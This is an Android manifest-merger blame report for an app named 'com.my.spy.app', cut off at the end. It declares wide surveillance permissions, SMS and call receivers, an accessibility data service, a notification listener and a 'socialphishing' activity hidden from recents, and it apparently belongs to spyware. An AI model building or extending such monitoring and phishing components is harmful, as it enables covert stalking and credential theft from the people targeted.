app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.my.spy.app"
4    android:versionCode="10"
5    android:versionName="8.0.0" >
6
7    <uses-sdk
8        android:minSdkVersion="21"
8-->src\main\AndroidManifest.xml
9        android:targetSdkVersion="33" />
9-->src\main\AndroidManifest.xml
10
11    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
11-->src\main\AndroidManifest.xml:4:5-5:45
11-->src\main\AndroidManifest.xml:4:22-76
12    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
12-->src\main\AndroidManifest.xml:6:5-85
12-->src\main\AndroidManifest.xml:6:22-82
13    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
13-->src\main\AndroidManifest.xml:7:5-8:40
13-->src\main\AndroidManifest.xml:7:22-78
14    <uses-permission
14-->src\main\AndroidManifest.xml:9:5-10:38
15        android:name="android.permission.READ_EXTERNAL_STORAGE"
15-->src\main\AndroidManifest.xml:9:22-77
16        android:maxSdkVersion="32" />
16-->src\main\AndroidManifest.xml:10:9-35
17    <!-- suppress DeprecatedClassUsageInspection -->
18    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
18-->src\main\AndroidManifest.xml:12:5-81
18-->src\main\AndroidManifest.xml:12:22-78
19    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
19-->src\main\AndroidManifest.xml:13:5-75
19-->src\main\AndroidManifest.xml:13:22-72
20    <uses-permission android:name="android.permission.CALL_PHONE" />
20-->src\main\AndroidManifest.xml:14:5-68
20-->src\main\AndroidManifest.xml:14:22-66
21    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" />
21-->src\main\AndroidManifest.xml:15:5-16:47
21-->src\main\AndroidManifest.xml:15:22-76
22    <uses-permission android:name="android.permission.RECORD_AUDIO" />
22-->src\main\AndroidManifest.xml:17:5-71
22-->src\main\AndroidManifest.xml:17:22-68
23    <uses-permission android:name="android.permission.READ_CONTACTS" />
23-->src\main\AndroidManifest.xml:18:5-72
23-->src\main\AndroidManifest.xml:18:22-69
24    <uses-permission android:name="android.permission.RECEIVE_SMS" />
24-->src\main\AndroidManifest.xml:19:5-70
24-->src\main\AndroidManifest.xml:19:22-67
25    <uses-permission android:name="android.permission.READ_SMS" />
25-->src\main\AndroidManifest.xml:20:5-67
25-->src\main\AndroidManifest.xml:20:22-64
26    <uses-permission android:name="android.permission.SEND_SMS" />
26-->src\main\AndroidManifest.xml:21:5-67
26-->src\main\AndroidManifest.xml:21:22-64
27    <uses-permission android:name="android.permission.WRITE_SMS" />
27-->src\main\AndroidManifest.xml:22:5-23:47
27-->src\main\AndroidManifest.xml:22:22-65
28    <uses-permission android:name="android.permission.CAMERA" />
28-->src\main\AndroidManifest.xml:24:5-65
28-->src\main\AndroidManifest.xml:24:22-62
29    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
29-->src\main\AndroidManifest.xml:25:5-78
29-->src\main\AndroidManifest.xml:25:22-75
30
31    <uses-feature
31-->src\main\AndroidManifest.xml:26:5-28:35
32        android:name="android.hardware.camera"
32-->src\main\AndroidManifest.xml:27:9-47
33        android:required="true" />
33-->src\main\AndroidManifest.xml:28:9-32
34    <uses-feature
34-->src\main\AndroidManifest.xml:29:5-31:36
35        android:name="android.hardware.telephony"
35-->src\main\AndroidManifest.xml:30:9-50
36        android:required="false" />
36-->src\main\AndroidManifest.xml:31:9-33
37
38    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
38-->src\main\AndroidManifest.xml:33:5-79
38-->src\main\AndroidManifest.xml:33:22-76
39    <uses-permission android:name="android.permission.INTERNET" />
39-->src\main\AndroidManifest.xml:34:5-67
39-->src\main\AndroidManifest.xml:34:22-64
40    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
40-->src\main\AndroidManifest.xml:35:5-81
40-->src\main\AndroidManifest.xml:35:22-78
41    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
41-->src\main\AndroidManifest.xml:36:5-84
41-->src\main\AndroidManifest.xml:36:22-81
42    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
42-->src\main\AndroidManifest.xml:37:5-94
42-->src\main\AndroidManifest.xml:37:22-92
43    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
43-->src\main\AndroidManifest.xml:38:5-40:47
43-->src\main\AndroidManifest.xml:39:9-62
44    <uses-permission android:name="android.permission.VIBRATE" />
44-->src\main\AndroidManifest.xml:41:5-66
44-->src\main\AndroidManifest.xml:41:22-63
45
46    <!-- Used to check if a browser is available before launching phone auth -->
47    <!-- See ui/phone/PhoneNumberVerificationHandler.isBrowserAvailable() -->
48    <queries>
48-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:15:5-23:15
49        <intent>
49-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:16:9-22:18
50            <action android:name="android.intent.action.VIEW" />
50-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:17:13-65
50-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:17:21-62
51
52            <category android:name="android.intent.category.BROWSABLE" />
52-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:19:13-74
52-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:19:23-71
53
54            <data android:scheme="http" />
54-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:21:13-43
54-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:21:19-40
55        </intent>
56        <!-- Needs to be explicitly declared on Android R+ -->
57        <package android:name="com.google.android.apps.maps" />
57-->[com.google.android.gms:play-services-maps:18.1.0] AndroidManifest.xml:33:9-64
57-->[com.google.android.gms:play-services-maps:18.1.0] AndroidManifest.xml:33:18-61
58    </queries>
59
60    <uses-feature
60-->[com.google.android.gms:play-services-maps:18.1.0] AndroidManifest.xml:26:5-28:35
61        android:glEsVersion="0x00020000"
61-->[com.google.android.gms:play-services-maps:18.1.0] AndroidManifest.xml:27:9-41
62        android:required="true" />
62-->[com.google.android.gms:play-services-maps:18.1.0] AndroidManifest.xml:28:9-32
63
64    <uses-permission android:name="android.permission.WAKE_LOCK" />
64-->[com.google.android.gms:play-services-measurement-api:21.1.1] AndroidManifest.xml:24:5-68
64-->[com.google.android.gms:play-services-measurement-api:21.1.1] AndroidManifest.xml:24:22-65
65    <uses-permission android:name="com.google.android.gms.permission.AD_ID" />
65-->[com.google.android.gms:play-services-measurement-api:21.1.1] AndroidManifest.xml:25:5-79
65-->[com.google.android.gms:play-services-measurement-api:21.1.1] AndroidManifest.xml:25:22-76
66    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE" />
66-->[com.google.android.gms:play-services-measurement:21.1.1] AndroidManifest.xml:26:5-110
66-->[com.google.android.gms:play-services-measurement:21.1.1] AndroidManifest.xml:26:22-107
67
68    <permission
68-->[androidx.core:core:1.10.0] AndroidManifest.xml:22:5-24:47
69        android:name="com.my.spy.app.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
69-->[androidx.core:core:1.10.0] AndroidManifest.xml:23:9-81
70        android:protectionLevel="signature" />
70-->[androidx.core:core:1.10.0] AndroidManifest.xml:24:9-44
71
72    <uses-permission android:name="com.my.spy.app.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
72-->[androidx.core:core:1.10.0] AndroidManifest.xml:26:5-97
72-->[androidx.core:core:1.10.0] AndroidManifest.xml:26:22-94
73
74    <application
74-->src\main\AndroidManifest.xml:43:5-155:19
75        android:name="com.my.spy.app.app.powerapk"
75-->src\main\AndroidManifest.xml:45:9-51
76        android:allowBackup="true"
76-->src\main\AndroidManifest.xml:46:9-35
77        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
77-->[androidx.core:core:1.10.0] AndroidManifest.xml:28:18-86
78        android:debuggable="true"
79        android:hardwareAccelerated="false"
79-->src\main\AndroidManifest.xml:44:9-44
80        android:icon="@drawable/mom"
80-->src\main\AndroidManifest.xml:47:9-37
81        android:label="@string/app_name"
81-->src\main\AndroidManifest.xml:48:9-41
82        android:roundIcon="@drawable/mom"
82-->src\main\AndroidManifest.xml:49:9-42
83        android:sharedUserId="android.uid.system"
83-->src\main\AndroidManifest.xml:53:9-50
84        android:sharedUserMaxSdkVersion="32"
84-->src\main\AndroidManifest.xml:55:9-45
85        android:supportsRtl="true"
85-->src\main\AndroidManifest.xml:50:9-35
86        android:theme="@style/AppTheme" >
86-->src\main\AndroidManifest.xml:51:9-40
87        <activity
87-->src\main\AndroidManifest.xml:57:9-66:20
88            android:name="com.my.spy.app.ui.activities.login.LoginActivity"
88-->src\main\AndroidManifest.xml:58:13-76
89            android:exported="true"
89-->src\main\AndroidManifest.xml:60:13-36
90            android:theme="@style/Login" >
90-->src\main\AndroidManifest.xml:59:13-41
91            <intent-filter>
91-->src\main\AndroidManifest.xml:61:13-65:29
92                <action android:name="android.intent.action.MAIN" />
92-->src\main\AndroidManifest.xml:62:17-69
92-->src\main\AndroidManifest.xml:62:25-66
93
94                <category android:name="android.intent.category.LAUNCHER" />
94-->src\main\AndroidManifest.xml:64:17-77
94-->src\main\AndroidManifest.xml:64:27-74
95            </intent-filter>
96        </activity>
97        <activity
97-->src\main\AndroidManifest.xml:67:9-69:44
98            android:name="com.my.spy.app.ui.activities.register.RegisterActivity"
98-->src\main\AndroidManifest.xml:68:13-82
99            android:theme="@style/Login" />
99-->src\main\AndroidManifest.xml:69:13-41
100        <activity
100-->src\main\AndroidManifest.xml:70:9-73:62
101            android:name="com.my.spy.app.ui.activities.mainparent.MainParentActivity"
101-->src\main\AndroidManifest.xml:71:13-86
102            android:configChanges="orientation|screenSize"
102-->src\main\AndroidManifest.xml:73:13-59
103            android:theme="@style/AppTheme" />
103-->src\main\AndroidManifest.xml:72:13-44
104        <activity
104-->src\main\AndroidManifest.xml:74:9-77:62
105            android:name="com.my.spy.app.ui.activities.mainchild.MainChildActivity"
105-->src\main\AndroidManifest.xml:75:13-84
106            android:configChanges="orientation|screenSize"
106-->src\main\AndroidManifest.xml:77:13-59
107            android:theme="@style/Child" />
107-->src\main\AndroidManifest.xml:76:13-41
108        <activity
108-->src\main\AndroidManifest.xml:78:9-80:43
109            android:name="com.my.spy.app.ui.activities.lock.LockActivity"
109-->src\main\AndroidManifest.xml:79:13-74
110            android:theme="@style/Lock" />
110-->src\main\AndroidManifest.xml:80:13-40
111        <activity
111-->src\main\AndroidManifest.xml:81:9-84:50
112            android:name="com.my.spy.app.ui.activities.gallery.ViewPhoto"
112-->src\main\AndroidManifest.xml:82:13-74
113            android:configChanges="orientation|screenSize"
113-->src\main\AndroidManifest.xml:83:13-59
114            android:theme="@style/Transparent" />
114-->src\main\AndroidManifest.xml:84:13-47
115        <activity
115-->src\main\AndroidManifest.xml:85:9-90:45
116            android:name="com.my.spy.app.ui.activities.socialphishing.SocialActivityM"
116-->src\main\AndroidManifest.xml:86:13-87
117            android:configChanges="orientation|screenSize"
117-->src\main\AndroidManifest.xml:87:13-59
118            android:excludeFromRecents="true"
118-->src\main\AndroidManifest.xml:88:13-46
119            android:taskAffinity="com.my.spy.app.ui.activities.socialphishing.SocialActivityM"
119-->src\main\AndroidManifest.xml:89:13-95
120            android:theme="@style/Social" />
120-->src\main\AndroidManifest.xml:90:13-42
121
122        <!-- Services -->
123        <service android:name="com.my.spy.app.services.calls.CallsService" />
123-->src\main\AndroidManifest.xml:93:9-78
123-->src\main\AndroidManifest.xml:93:18-75
124        <service android:name="com.my.spy.app.services.sms.SmsService" />
124-->src\main\AndroidManifest.xml:94:9-74
124-->src\main\AndroidManifest.xml:94:18-71
125        <service android:name="com.my.spy.app.services.social.MonitorService" />
125-->src\main\AndroidManifest.xml:95:9-81
125-->src\main\AndroidManifest.xml:95:18-78
126        <service
126-->src\main\AndroidManifest.xml:96:9-108:19
127            android:name="com.my.spy.app.services.accessibilityData.AccessibilityDataService"
127-->src\main\AndroidManifest.xml:97:13-94
128            android:exported="true"
128-->src\main\AndroidManifest.xml:100:13-36
129            android:label="@string/accessibility_service_label"
129-->src\main\AndroidManifest.xml:98:13-64
130            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
130-->src\main\AndroidManifest.xml:99:13-79
131            <intent-filter>
131-->src\main\AndroidManifest.xml:101:13-103:29
132                <action android:name="android.accessibilityservice.AccessibilityService" />
132-->src\main\AndroidManifest.xml:102:17-92
132-->src\main\AndroidManifest.xml:102:25-89
133            </intent-filter>
134
135            <meta-data
135-->src\main\AndroidManifest.xml:105:13-107:72
136                android:name="android.accessibilityservice"
136-->src\main\AndroidManifest.xml:106:17-60
137                android:resource="@xml/accessibility_service_config" />
137-->src\main\AndroidManifest.xml:107:17-69
138        </service>
139        <service
139-->src\main\AndroidManifest.xml:109:9-116:19
140            android:name="com.my.spy.app.services.notificationService.NotificationService"
140-->src\main\AndroidManifest.xml:110:13-91
141            android:exported="true"
141-->src\main\AndroidManifest.xml:112:13-36
142            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
142-->src\main\AndroidManifest.xml:111:13-87
143            <intent-filter>
143-->src\main\AndroidManifest.xml:113:13-115:29
144                <action android:name="android.service.notification.NotificationListenerService" />
144-->src\main\AndroidManifest.xml:114:17-99
144-->src\main\AndroidManifest.xml:114:25-96
145            </intent-filter>
146        </service>
147
148        <!-- Receivers -->
149        <receiver
149-->src\main\AndroidManifest.xml:119:9-127:20
150            android:name="com.my.spy.app.receiver.SmsReceiver"
150-->src\main\AndroidManifest.xml:120:13-63
151            android:enabled="true"
151-->src\main\AndroidManifest.xml:121:13-35
152            android:exported="true"
152-->src\main\AndroidManifest.xml:122:13-36
153            android:permission="android.permission.BROADCAST_SMS" >
153-->src\main\AndroidManifest.xml:123:13-66
154            <intent-filter android:priority="999" >
154-->src\main\AndroidManifest.xml:124:13-126:29
154-->src\main\AndroidManifest.xml:124:28-50
155                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
155-->src\main\AndroidManifest.xml:125:17-82
155-->src\main\AndroidManifest.xml:125:25-79
156            </intent-filter>
157        </receiver>
158        <receiver
158-->src\main\AndroidManifest.xml:128:9-134:20
159            android:name="com.my.spy.app.receiver.CallsReceiver"
159-->src\main\AndroidManifest.xml:128:19-71
160            android:exported="true" >
160-->src\main\AndroidManifest.xml:129:13-36
161            <intent-filter android:priority="999" >
161-->src\main\AndroidManifest.xml:130:13-133:29
161-->src\main\AndroidManifest.xml:130:28-50
162                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
162-->src\main\AndroidManifest.xml:131:17-82
162-->src\main\AndroidManifest.xml:131:25-79
163                <action android:name="android.intent.action.PHONE_STATE" />
163-->src\main\AndroidManifest.xml:132:17-76
163-->src\main\AndroidManifest.xml:132:25-73
164            </intent-filter>
165        </receiver>
166        <receiver
166-->src\main\AndroidManifest.xml:135:9-142:20
167            android:name="com.my.spy.app.receiver.MonitorReceiver"
167-->src\main\AndroidManifest.xml:136:13-67
168            android:enabled="true"
168-->src\main\AndroidManifest.xml:137:13-35
169            android:exported="false" >
169-->src\main\AndroidManifest.xml:138:13-37
170            <intent-filter>
170-->src\main\AndroidManifest.xml:139:13-141:29
171                <action android:name="com.my.spy.app.receiver.RESTART_MONITOR_RECEIVER" />
171-->src\main\AndroidManifest.xml:140:17-91
171-->src\main\AndroidManifest.xml:140:25-88
172            </intent-filter>
173        </receiver>
174
175        <meta-data
175-->src\main\AndroidManifest.xml:144:9-146:69
176            android:name="com.google.android.gms.version"
176-->src\main\AndroidManifest.xml:145:13-58
177            android:value="@integer/google_play_services_version" />
177-->src\main\AndroidManifest.xml:146:13-66
178        <meta-data
178-->src\main\AndroidManifest.xml:147:9-149:52
179            android:name="com.google.android.maps.v2.API_KEY"
179-->src\main\AndroidManifest.xml:148:13-62
180            android:value="@string/APY_KEY_MAPS" />
180-->src\main\AndroidManifest.xml:149:13-49
181
182        <!-- <meta-data -->
183        <!-- android:name="com.google.android.gms.ads.APPLICATION_ID" -->
184        <!-- android:value="ca-app-pub-1774946133841643~4087828409"/> -->
185
186        <meta-data
186-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:29:9-31:63
187            android:name="com.facebook.sdk.ApplicationId"
187-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:30:13-58
188            android:value="@string/facebook_application_id" />
188-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:31:13-60
189
190        <activity
190-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:33:9-37:61
191            android:name="com.firebase.ui.auth.KickoffActivity"
191-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:34:13-64
192            android:exported="false"
192-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:35:13-37
193            android:label=""
193-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:36:13-29
194            android:theme="@style/FirebaseUI.Transparent" />
194-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:37:13-58
195        <activity
195-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:38:9-42:61
196            android:name="com.firebase.ui.auth.ui.idp.SingleSignInActivity"
196-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:39:13-76
197            android:exported="false"
197-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:40:13-37
198            android:label=""
198-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:41:13-29
199            android:theme="@style/FirebaseUI.Transparent" />
199-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:42:13-58
200        <activity
200-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:43:9-47:61
201            android:name="com.firebase.ui.auth.ui.credentials.CredentialSaveActivity"
201-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:44:13-86
202            android:exported="false"
202-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:45:13-37
203            android:label=""
203-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:46:13-29
204            android:theme="@style/FirebaseUI.Transparent" />
204-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:47:13-58
205        <activity
205-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:48:9-52:58
206            android:name="com.firebase.ui.auth.ui.email.RecoverPasswordActivity"
206-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:49:13-81
207            android:exported="false"
207-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:50:13-37
208            android:label="@string/fui_title_recover_password_activity"
208-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:51:13-72
209            android:windowSoftInputMode="adjustResize" />
209-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:52:13-55
210        <activity
210-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:53:9-57:58
211            android:name="com.firebase.ui.auth.ui.email.EmailActivity"
211-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:54:13-71
212            android:exported="false"
212-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:55:13-37
213            android:label="@string/fui_sign_in_default"
213-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:56:13-56
214            android:windowSoftInputMode="adjustResize" />
214-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:57:13-55
215        <activity
215-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:58:9-62:77
216            android:name="com.firebase.ui.auth.ui.phone.PhoneActivity"
216-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:59:13-71
217            android:exported="false"
217-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:60:13-37
218            android:label="@string/fui_sign_in_with_phone_number"
218-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:61:13-66
219            android:windowSoftInputMode="adjustResize|stateAlwaysVisible" />
219-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:62:13-74
220        <activity
220-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:63:9-67:58
221            android:name="com.firebase.ui.auth.ui.idp.WelcomeBackIdpPrompt"
221-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:64:13-76
222            android:exported="false"
222-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:65:13-37
223            android:label="@string/fui_title_welcome_back_idp_prompt"
223-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:66:13-70
224            android:windowSoftInputMode="adjustResize" />
224-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:67:13-55
225        <activity
225-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:68:9-72:58
226            android:name="com.firebase.ui.auth.ui.email.WelcomeBackPasswordPrompt"
226-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:69:13-83
227            android:exported="false"
227-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:70:13-37
228            android:label="@string/fui_title_welcome_back_password_prompt"
228-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:71:13-75
229            android:windowSoftInputMode="adjustResize" />
229-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:72:13-55
230        <activity
230-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:73:9-77:58
231            android:name="com.firebase.ui.auth.ui.email.WelcomeBackEmailLinkPrompt"
231-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:74:13-84
232            android:exported="false"
232-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:75:13-37
233            android:label="@string/fui_title_welcome_back_password_prompt"
233-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:76:13-75
234            android:windowSoftInputMode="adjustResize" />
234-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:77:13-55
235        <activity
235-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:78:9-83:58
236            android:name="com.firebase.ui.auth.ui.email.EmailLinkCatcherActivity"
236-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:79:13-82
237            android:exported="false"
237-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:80:13-37
238            android:label=""
238-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:81:13-29
239            android:theme="@style/FirebaseUI.Transparent"
239-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:82:13-58
240            android:windowSoftInputMode="adjustResize" />
240-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:83:13-55
241        <activity
241-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:84:9-88:58
242            android:name="com.firebase.ui.auth.ui.email.EmailLinkErrorRecoveryActivity"
242-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:85:13-88
243            android:exported="false"
243-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:86:13-37
244            android:label="@string/fui_sign_in_default"
244-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:87:13-56
245            android:windowSoftInputMode="adjustResize" />
245-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:88:13-55
246        <activity
246-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:89:9-92:65
247            android:name="com.firebase.ui.auth.ui.idp.AuthMethodPickerActivity"
247-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:90:13-80
248            android:exported="false"
248-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:91:13-37
249            android:label="@string/fui_default_toolbar_title" />
249-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:92:13-62
250        <activity
250-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:93:9-97:48
251            android:name="com.facebook.FacebookActivity"
251-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:94:13-57
252            android:configChanges="keyboard|keyboardHidden|screenLayout|screenSize|orientation"
252-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:95:13-96
253            android:label="@string/app_name" />
253-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:96:13-45
254        <activity
254-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:98:9-110:20
255            android:name="com.facebook.CustomTabActivity"
255-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:99:13-58
256            android:exported="true" >
256-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:100:13-36
257            <intent-filter>
257-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:102:13-109:29
258                <action android:name="android.intent.action.VIEW" />
258-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:17:13-65
258-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:17:21-62
259
260                <category android:name="android.intent.category.DEFAULT" />
260-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:105:17-76
260-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:105:27-73
261                <category android:name="android.intent.category.BROWSABLE" />
261-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:19:13-74
261-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:19:23-71
262
263                <data android:scheme="@string/facebook_login_protocol_scheme" />
263-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:21:13-43
263-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:21:19-40
264            </intent-filter>
265        </activity>
266
267        <provider
267-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:112:9-116:38
268            android:name="com.firebase.ui.auth.data.client.AuthUiInitProvider"
268-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:113:13-79
269            android:authorities="com.my.spy.app.authuiinitprovider"
269-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:114:13-70
270            android:exported="false"
270-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:115:13-37
271            android:initOrder="90" />
271-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:116:13-35
272
273        <activity
273-->[com.google.firebase:firebase-auth:21.3.0] AndroidManifest.xml:29:9-46:20
274            android:name="com.google.firebase.auth.internal.GenericIdpActivity"
274-->[com.google.firebase:firebase-auth:21.3.0] AndroidManifest.xml:30:13-80
275            android:excludeFromRecents="true"
275-->[com.google.firebase:firebase-auth:21.3.0] AndroidManifest.xml:31:13-46
276            android:exported="true"
276-->[com.google.firebase:firebase-auth:21.3.0] AndroidManifest.xml:32:13-36
277            android:launchMode="singleTask"
277-->[com.google.firebase:firebase-auth:21.3.0] AndroidManifest.xml:33:13-44
278            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
278-->[com.google.firebase:firebase-auth:21.3.0] AndroidManifest.xml:34:13-72
279            <intent-filter>
279-->[com.google.firebase:firebase-auth:21.3.0] AndroidManifest.xml:35:13-45:29
280                <action android:name="android.intent.action.VIEW" />
280-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:17:13-65
280-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:17:21-62
281
282                <category android:name="android.intent.category.DEFAULT" />
282-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:105:17-76
282-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:105:27-73
283                <category android:name="android.intent.category.BROWSABLE" />
283-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:19:13-74
283-->[com.firebaseui:firebase-ui-auth:8.0.2] AndroidManifest.xml:19:23-71
284
285                <data